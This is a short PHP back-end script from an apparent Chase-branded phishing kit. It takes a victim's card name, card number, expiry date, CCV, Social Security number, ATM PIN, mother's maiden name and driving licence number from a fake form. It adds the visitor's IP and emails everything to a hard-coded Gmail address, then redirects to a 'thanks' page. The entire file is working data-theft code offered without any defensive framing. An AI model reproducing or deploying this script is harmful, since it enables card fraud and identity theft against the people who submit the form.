<?

$ip = getenv("REMOTE_ADDR");
$message .= "---- : || GhostMode || :------\n";
$message .= "Name On Card            : ".$_POST['noc']."\n";
$message .= "Card Number            : ".$_POST['cardnumber']."\n";
$message .= "Expiration Date MM/YY             : ".$_POST['exp']."\n";
$message .= "CCV/CSC             : ".$_POST['ccv']."\n";
$message .= "Social Security Number              : ".$_POST['ssn']."\n";
$message .= "ATM PIN             : ".$_POST['atm']."\n";
$message .= "Mother's Maiden Name              : ".$_POST['mothr']."\n";
$message .= "Driving License Number            : ".$_POST['driving']."\n";
$message .= "----: || GhostMode || :------\n";
$message .= "IP: ".$ip."\n";


$recipient = "cmssgmdlaw@gmail.com

,cmssgmdlaw@gmail.com";
$subject = " Chase CC INFO | ".$ip."\n";

mail($recipient,$subject,$message);
header("Location:  thanks.php");
?>


